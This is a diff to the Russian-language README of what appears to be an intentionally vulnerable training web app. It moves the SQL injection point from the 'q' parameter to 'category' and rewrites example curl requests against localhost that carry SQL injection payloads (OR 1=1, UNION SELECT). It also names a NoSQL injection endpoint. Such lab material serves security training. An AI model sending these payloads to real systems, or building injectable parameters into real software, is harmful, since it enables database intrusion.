@@ -24,7 +24,7 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 ## Карта уязвимостей (без подсказок в интерфейсе)
 
 ### SQL Injection
-- `GET /products/search?q=...&category=...` — единственная SQLi-точка в приложении (classic/error/union/boolean/time через разные payload'ы).
+- `GET /products/search?q=...&category=...` — единственная SQLi-точка в приложении (вектор оставлен в `category`, параметр `q` обрабатывается параметризованно).
 
 ### NoSQL Injection
 - `GET|POST /product/<pid>/reviews/moderation` (фильтр модерации отзывов с JSON-like значениями)
@@ -75,10 +75,10 @@ Swagger UI доступен на `http://localhost:8000/swagger`.
 
 **`/products/search?q=...&category=...`:**
 ```bash
-curl "http://localhost:8000/products/search?q=' OR 1=1 -- -&category=%"
-curl "http://localhost:8000/products/search?q=' UNION SELECT 1,2,3,4,'x' -- -&category=%"
+curl "http://localhost:8000/products/search?q=keyboard&category=%"
+curl "http://localhost:8000/products/search?q=mouse&category=' OR 1=1 -- -"
 curl "http://localhost:8000/products/search?q=test&category=electronics' OR '1'='1"
-curl "http://localhost:8000/products/search?q=' OR IF(1=1,SLEEP(3),0) -- -&category=%"
+curl "http://localhost:8000/products/search?q=desk&category=%' UNION SELECT 1,2,3,4,'x' -- -"
 ```
 
 ### NoSQL Injection (`/product/<pid>/reviews/moderation`)
